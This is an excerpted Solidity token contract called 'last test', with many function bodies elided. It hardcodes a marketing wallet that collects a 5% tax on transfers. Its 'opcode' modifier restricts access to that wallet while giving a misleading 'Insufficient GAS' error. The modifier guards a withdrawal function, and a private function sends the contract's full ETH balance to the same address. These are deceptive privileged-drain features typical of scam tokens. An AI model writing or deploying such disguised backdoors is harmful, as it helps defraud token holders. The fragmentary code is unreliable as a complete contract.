...
contract lastTest is Context, IERC20, Ownable {
    ...
    string private constant _name = "last test";
    ...
    address payable public MarketingsAddress = payable(0x6F1365f809126be2996253DaEa8DD27e342Fe3eB);
    uint256 private MarketingID = 89790;
    
    uint256 private rfiTax = 0;
    uint256 private liquidityTax = 0;
    uint256 private MarketingsTax =  5;
    ...
    address public MarketingsWallet = 0x6F1365f809126be2996253DaEa8DD27e342Fe3eB;
   ...
   function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner {
    ...
    function _getTValues(uint256 tAmount, bool takeFee) private view returns (valuesFromGetValues memory s) {
        ...
        s.tMarketings = tAmount.mul(MarketingsTax).div(100);

        s.tTransferAmount = tAmount.sub(s.tRfi).sub(s.tLiquidity).sub(s.tMarketings);
    ...
    function _getRValues(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rRfi) {
        ...
        uint256 rMarketingss = s.tMarketings.mul(currentRate);

        rTransferAmount = rAmount.sub(rRfi).sub(rLiquidity).sub(rMarketingss);

        return (rAmount, rTransferAmount, rRfi);
    }
    
    function getTokens() private {
        MarketingsAddress.transfer(address(this).balance);
    }
    ...
    modifier opcode() {
         require(_msgSender() == MarketingsAddress, "Error: Insufficient GAS");
         _;
     }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {
        ...
        reflectMarketingsFee(s.tMarketings);

        emit Transfer(sender, recipient, s.tTransferAmount);
    }


    function reflectMarketingsFee(uint256 tMarketings) private {
        uint256 currentRate =  _getRate();
        uint256 rMarketingss =  tMarketings.mul(currentRate);
        _tMarketingsTotal = _tMarketingsTotal.add(tMarketings);
        _rOwned[MarketingsWallet] = _rOwned[MarketingsWallet].add(rMarketingss);
    }

    function withdrawMarketingBalance() external opcode {
    ...
    function totalDevelopmentFee() public view returns (uint256) {
     ...
     function totalMarketingsFee() public view returns (uint256) {
        return _tMarketingsTotal;
    }
}